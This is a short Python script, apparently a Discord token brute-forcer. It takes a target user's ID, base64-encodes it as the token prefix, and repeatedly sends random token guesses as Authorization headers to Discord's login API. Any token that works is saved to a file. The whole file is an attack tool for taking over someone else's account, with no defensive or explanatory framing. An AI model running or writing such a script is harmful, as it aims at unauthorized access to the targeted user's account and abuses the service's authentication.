import base64
import requests
import os
import string
import random

os.system("cls")

id_to_token = base64.b64encode((input("What is the User's ID?: ")).encode("ascii"))
id_to_token = str(id_to_token)[2:-1]

while id_to_token == id_to_token:
    token = id_to_token + '.' + ('').join(random.choices(string.ascii_letters + string.digits, k=5)) + '.' + ('').join(random.choices(string.ascii_letters + string.digits, k=25))
    headers={
        'Authorization': token
            }
    login = requests.get('https://discordapp.com/api/v9/auth/login', headers=headers)
    try:
        if login.status_code == 200:
            print('\033[32' + ' [+] VALID' + ' ' + token)
            f = open('VALID.txt', "a+")
            f.write(f'{token}\n')
            break
        else:
            print('[-] INVALID' + ' ' + token) 
    finally:
        print("")
input()